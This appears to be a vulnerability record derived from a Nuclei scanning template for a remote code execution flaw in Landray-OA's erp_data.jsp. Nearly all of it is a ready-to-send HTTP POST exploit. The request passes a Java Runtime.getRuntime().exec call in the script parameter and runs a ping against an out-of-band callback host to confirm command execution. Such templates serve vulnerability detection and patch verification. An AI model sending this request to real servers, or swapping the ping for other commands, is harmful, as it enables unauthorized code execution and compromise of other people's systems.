# Vulnerability: Landray-OA - Remote Code Execution
**Classification:** LANDRAY
**Source:** Nuclei Template (`landray-oa-erp-data-rce.yaml`)

## Description
Landray-OA `erp_data.jsp` is vulnerable to remote code execution vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

var={"body":{"file":"/tic/core/resource/js/erp_data.jsp"}}&erpServcieName=sysFormulaValidate&script=Runtime.getRuntime().exec("ping -c 4 {{interactsh-url}}");
```

